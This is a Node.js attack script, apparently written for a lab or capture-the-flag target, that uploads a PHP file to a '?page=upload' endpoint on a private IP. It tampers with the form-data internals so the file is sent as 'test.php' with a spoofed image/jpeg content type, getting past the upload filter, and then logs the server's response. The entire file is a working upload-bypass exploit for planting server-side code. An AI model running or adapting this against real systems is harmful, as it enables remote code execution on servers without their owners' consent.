var http = require("http");
var FormData = require('form-data');
var fs = require('fs');
var form = new FormData();
form.append('MAX_FILE_SIZE', 10000);
form.append('uploaded', fs.createReadStream('./test.php'));
form._valuesToMeasure[0].path = "test.jpg";
var stream = form._streams[3].split(";");
form._streams[3] = stream[0] + ";" + stream[1] + ";" + " filename=\"test.php\"\r\nContent-Type: image/jpeg\r\n\r\n";
form.append('Upload', 'Upload');
console.log(form);
var options = {
	hostname: '10.13.0.224',
	port: 80,
	path: '/?page=upload',
	method: 'POST',
	headers: form.getHeaders()
};
var req = http.request(options);

form.pipe(req);

req.on('response', function(res) {
	console.log('Status: ' + res.statusCode);
	console.log('Headers: ' + JSON.stringify(res.headers));
	res.setEncoding('utf8');
	res.on('data', function (body) {
		console.log('Body: ' + body);
	});
});

req.on('error', function(e) {
	console.log('problem with request: ' + e.message);
});
